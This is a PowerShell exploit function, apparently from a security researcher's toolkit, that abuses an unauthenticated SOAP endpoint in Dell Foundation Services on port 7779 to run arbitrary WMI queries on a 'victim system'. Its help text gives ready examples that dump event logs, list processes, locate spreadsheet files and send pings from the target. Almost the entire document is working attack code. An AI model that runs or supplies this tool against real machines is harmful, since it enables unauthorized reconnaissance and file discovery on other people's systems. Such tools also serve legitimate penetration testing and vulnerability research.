function Get-DellFoundationServicesWmiObject {
<#
.SYNOPSIS

Performs a WMI query on a Dell Foundation Services server.

Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause

.DESCRIPTION

Get-DellFoundationServicesWmiObject exploits the information disclosure vulnerability described here: http://lizardhq.org/2015/12/01/dell-foundation-services.2.html

This function allows you to perform unauthenticated remote WMI queries within the root/cimv2 namespace on a victim system.

.PARAMETER IPAddress

Specifies the IP address of the victim system

.PARAMETER Query

Specifies a well-formed WMI query for objects within the root/cimv2 namespace. i.e. most Win32_* class instances.

.PARAMETER FakeNamespaceDomain

Specifies a fake SOAP namespace domain.

.EXAMPLE

Get-DellFoundationServicesWmiObject -IPAddress 10.0.0.10 -Query 'SELECT * FROM Win32_NtLogEvent WHERE Logfile="System"'

Description
-----------
Dumps the System event log

.EXAMPLE

Get-DellFoundationServicesWmiObject -IPAddress 10.0.0.10 -Query 'SELECT * FROM Win32_PingStatus WHERE Address="8.8.8.8"'

Description
-----------
Pings 8.8.8.8 from the victim system.

.EXAMPLE

Get-DellFoundationServicesWmiObject -IPAddress 10.0.0.10 -Query 'SELECT * FROM CIM_DataFile WHERE Extension="xlsx"'

Description
-----------
Lists all .xlsx files present on the system.

.EXAMPLE

Get-DellFoundationServicesWmiObject -IPAddress 10.0.0.10 -Query 'SELECT * FROM Win32_Process'

Description
-----------
Lists all running processes

.LINK

http://lizardhq.org/2015/12/01/dell-foundation-services.2.html
#>

    param (
        [Parameter(Mandatory=$True)]
        [Net.IPAddress]
        $IPAddress,

        [Parameter(Mandatory=$True)]
        [String]
        [ValidateNotNullOrEmpty()]
        $Query,

        [String]
        [ValidateNotNullOrEmpty()]
        $FakeNamespaceDomain = 'tempuri.org'
    )

    $URI = 'http://{0}:7779/Dell%20Foundation%20Services/ISystemInfoCapabilitiesApi' -f $IPAddress

    $SoapRequest = [Xml] @"
<?xml version="1.0" encoding="UTF-8"?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns1="http://$FakeNamespaceDomain/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<SOAP-ENV:Body>
<ns1:GetWmiCollection>
<ns1:wmiQuery xsi:type="xsd:string">$Query</ns1:wmiQuery>
</ns1:GetWmiCollection></SOAP-ENV:Body>
</SOAP-ENV:Envelope>
"@

    # Slightly modified code from http://iislogs.com/steveschofield/2010/01/17/execute-a-soap-request-from-powershell/
    $WebRequest = [Net.WebRequest]::Create($URI) 
    $WebRequest.Headers.Add('SOAPAction',"`"http://$FakeNamespaceDomain/ISystemInfoCapabilitiesApi/GetWmiCollection`"")

    $WebRequest.ContentType = 'text/xml; charset=utf-8'
    $WebRequest.Accept = 'text/xml'
    $WebRequest.Method = 'POST' 
    
    $ResponseXml = $null

    try {
        $RequestStream = $WebRequest.GetRequestStream() 
        $SoapRequest.Save($RequestStream) 
        $RequestStream.Close() 
        
        $Response = $WebRequest.GetResponse() 
        $ResponseStream = $Response.GetResponseStream() 
        $StreamReader = [IO.StreamReader]($ResponseStream) 
        $ResponseXml = [Xml] $StreamReader.ReadToEnd() 
        $ResponseStream.Close()
    } catch {
        throw $_
    }

    if ($ResponseXml -and ($ResponseXml.Envelope.Body.GetWmiCollectionResponse.GetWmiCollectionResult.WmiManagementItem)) {
        $WMIManagementItems = @($ResponseXml.Envelope.Body.GetWmiCollectionResponse.GetWmiCollectionResult.WmiManagementItem)

        foreach ($Object in $WMIManagementItems) {
            $Properties = @{
                ClassName = $Object.ClassName
                Endpoint = $Object.Endpoint
                Namespace = $Object.Namespace
                Properties = $Object.WmiProperties.WmiTriplet
            }

            New-Object PSObject -Property $Properties
        }
    }
}